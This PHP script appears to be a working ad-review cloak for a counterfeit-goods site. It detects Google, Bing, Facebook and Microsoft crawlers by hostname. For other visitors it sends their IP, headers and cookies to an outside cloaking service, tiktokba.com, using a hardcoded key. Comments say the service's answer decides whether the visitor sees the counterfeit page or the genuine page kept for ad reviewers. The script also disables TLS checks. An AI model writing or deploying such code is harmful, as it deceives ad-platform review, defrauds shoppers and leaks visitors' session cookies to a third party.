<?php

$dsn = "DRIVER=Microsoft Access Driver (*.mdb);dbq=".realpath("qq.not3");
$conn = @odbc_connect($dsn,"","",SQL_CUR_USE_ODBC ) or die ("Connect Error!");
$sql = "select * from qq where zt=0 order by xsa,id";
$rs = @odbc_do($conn,$sql);
$switch = true;
while(odbc_fetch_row($rs)){
    if(intval(odbc_result($rs,"switch"))){
        $switch = true;
    } else {
        $switch = false;
    }
}

odbc_close($conn);


ini_set("display_errors", "Off");
error_reporting(0);

$jsonData = array();                                // 初始化接口发送数据
if (isset($_SERVER['HTTP_CF_CONNECTING_IP'])) {     // 使用cloudflare 转发的IP地址
    $ip = $_SERVER['HTTP_CF_CONNECTING_IP'];
} else {
    if (getenv('HTTP_CLIENT_IP') && strcasecmp(getenv('HTTP_CLIENT_IP'), 'unknown')) {
        $ip = getenv('HTTP_CLIENT_IP');
    } elseif (getenv('HTTP_X_FORWARDED_FOR') && strcasecmp(getenv('HTTP_X_FORWARDED_FOR'), 'unknown')) {
        $ip = getenv('HTTP_X_FORWARDED_FOR');
    } elseif (getenv('REMOTE_ADDR') && strcasecmp(getenv('REMOTE_ADDR'), 'unknown')) {
        $ip = getenv('REMOTE_ADDR');
    } elseif (isset($_SERVER['REMOTE_ADDR']) && $_SERVER['REMOTE_ADDR'] && strcasecmp($_SERVER['REMOTE_ADDR'], 'unknown')) {
        $ip = $_SERVER['REMOTE_ADDR'];
    }
}
$boolean = true;
$hostname = gethostbyaddr($ip);
if (!empty($hostname)) {
    if(is_numeric(stripos($hostname, 'google')) || is_numeric(stripos($hostname, 'bing')) || is_numeric(stripos($hostname, 'facebook')) || is_numeric(stripos($hostname, 'microsoft'))) {
        $boolean = false;
    }
}

//add by new cloak
function is_https()
{
    if (isset($_SERVER['HTTPS']) && strtolower($_SERVER['HTTPS']) === 'on')
    {
        return TRUE;
    }
    elseif (isset($_SERVER['HTTP_X_FORWARDED_PROTO']) && $_SERVER['HTTP_X_FORWARDED_PROTO'] === 'https')
    {
        return TRUE;
    }
    elseif (isset($_SERVER['HTTP_FRONT_END_HTTPS']) && $_SERVER['HTTP_FRONT_END_HTTPS'] === 'on')
    {
        return TRUE;
    }
    return FALSE;
}

function browser_headers()
{
    $headers = array();
    foreach ($_SERVER as $name => $value) {
        if (preg_match('/^HTTP_/', $name)) {
            // convert HTTP_HEADER_NAME to header-name
            $name = strtr(substr($name, 5), '_', '-');
            $name = strtolower($name);
            $headers[$name] = $value;
        }
    }
    return $headers;
}

function encode_visitor_cookies()
{
    $transmit_string = "";

    foreach ($_COOKIE as $name => $value) {
        try {
            $transmit_string .= "$name=$value; ";
        } catch (Exception $e) {
            continue;
        }
    }

    return $transmit_string;
}

function forward_response_cookies($ch, $headerLine)
{
    if (preg_match('/^Set-Cookie:/mi', $headerLine, $cookie)) {
        header($headerLine, false);
    }

    return strlen($headerLine); // Needed by curl
}

function get_SERVER_value($field_name)
{
    return isset($_SERVER[$field_name]) ? $_SERVER[$field_name] : null;
}

//add by new cloak END

if($boolean) {
    $headers = browser_headers();
//    $visit_domain = str_replace('www.', '', $_SERVER['HTTP_HOST']);     // 当前网站域名
    $visit_domain = (is_https() ? "https://" : "http://"). $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
    $jsonData['id'] = '1gpWBa';
    $jsonData['ip'] = $ip;
    $jsonData['domain'] = $visit_domain;
    $jsonData['country_code'] = 'JP';  //设置该参数后，将替换"广告策略》访问者地理位置>过滤"的设置，填写国家代码,多个用逗号分隔，如：US,GB,CA,AU,IE,NZ
    $jsonData['referer'] = get_SERVER_value('HTTP_REFERER');
    $jsonData['headers'] = json_encode($headers);
    $ch = curl_init('http://www.tiktokba.com/cloak/byApi');

    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_IPRESOLVE, CURL_IPRESOLVE_V4);
    curl_setopt($ch, CURLOPT_USERAGENT, get_SERVER_value('HTTP_USER_AGENT'));
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);

    curl_setopt($ch, CURLOPT_ENCODING, ""); //Enables compression
    curl_setopt($ch, CURLOPT_HTTPHEADER, ["Content-type: application/json"]);
    curl_setopt($ch, CURLOPT_HTTPHEADER, ["escloak-key: xio83uvN6bUmW4Ide0ayOztc5pYjHLlk"]);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($jsonData));
    curl_setopt($ch, CURLOPT_HEADERFUNCTION, "forward_response_cookies"); //Forward response's cookies to visitor
    if ($_COOKIE) {//Forward visitor's cookie to our server
        curl_setopt($ch, CURLOPT_COOKIE, encode_visitor_cookies());
    }
    $return = curl_exec($ch);
    $return = json_decode($return, true);
    $boolean = $return['result'];           // 返回true 访问仿品，返回false 访问正品
}

if($switch){
    $boolean = false;   // 广告通过审核前 请勿删除此行。
}
if(!$boolean){
    $trueDomain = 'http://'.$_SERVER['SERVER_NAME'].'/zp';      // 这里输入审核页面的首页地址
    // header("Location: " . $trueDomain);exit;
    echo file_get_content_sstr($trueDomain);exit;
}

function file_get_content_sstr($url) {
    $ch = curl_init();
    $timeout = 30;
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_HEADER, 0);            //不取得返回头信息
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $timeout);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 3);
    // https请求 不验证证书和hosts
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE);
    $file_contents = curl_exec($ch);
    curl_close($ch);
    return $file_contents;
}
?>